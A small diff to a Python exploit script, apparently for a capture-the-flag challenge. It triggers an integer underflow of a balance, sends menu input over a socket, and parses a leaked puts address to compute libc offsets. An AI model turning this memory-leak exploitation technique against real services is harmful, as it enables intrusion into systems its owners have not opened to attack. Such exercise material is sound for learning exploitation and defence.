@@ -42,8 +42,7 @@ try:
 
     # get balance to underflow
     run_steps("1_spam_tips.txt")
-
-    res = run_steps("2_find_puts.txt")
+    res = send("2\n3\ny\n")
 
     # get address of puts
     pattern = r"0x[0-9a-f]+"
@@ -53,7 +52,10 @@ try:
     def puts_offset(addr):
         return hex(int(puts_addr, 16) + int(addr, 16))
 
+    #
+
     # Close the socket
     conn.close()
+
 except Exception as e:
     print(f"Error: {e}")
